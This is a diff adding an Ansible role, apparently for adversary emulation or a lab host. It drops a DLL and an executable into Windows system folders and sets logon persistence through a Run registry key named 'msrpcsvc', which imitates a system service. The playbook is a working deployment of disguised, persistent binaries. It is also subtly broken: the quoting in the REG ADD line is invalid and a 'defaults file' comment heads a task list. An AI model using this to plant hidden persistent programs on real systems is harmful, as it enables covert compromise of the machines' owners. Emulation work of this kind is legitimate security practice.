@@ -1,0 +1,17 @@
+---
+# defaults file for zukaki
+---
+- name: Copy zukaki DLL
+  win_copy:
+    src: "files/hiyokime.dll"
+    dest: 'C:\Windows\Help\hiyokime.dll'
+
+- name: Copy zukaki exec
+  win_copy:
+    src: "files/z4i.exe"
+    dest: 'C:\Windows\System32\Speech\z4i.exe'
+
+- name: set perisistance by creating a service 
+  win_command: "{{ item }}"
+  loop:
+    - "REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "msrpcsvc" /t REG_SZ /F /D "C:\Windows\System32\Speech\z4i.exe" /f"
